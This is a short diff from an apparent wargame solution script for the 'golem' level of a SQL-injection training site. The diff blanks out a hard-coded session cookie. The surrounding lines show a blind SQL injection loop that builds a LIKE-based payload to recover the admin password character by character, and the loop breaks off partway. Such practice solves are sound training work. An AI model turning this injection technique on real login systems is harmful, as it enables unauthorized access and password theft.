@@ -6,7 +6,7 @@ value = ""
 i = start
 
 url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"
-cookies = {"PHPSESSID":"cf8bml1u8rep03adn37hkqm0v6"}
+cookies = {"PHPSESSID":""}
 
 while 1:
 	sql = "\' || (id like \'admin\' && pw like \'"+value+chr(i)+"%\') -- \'"
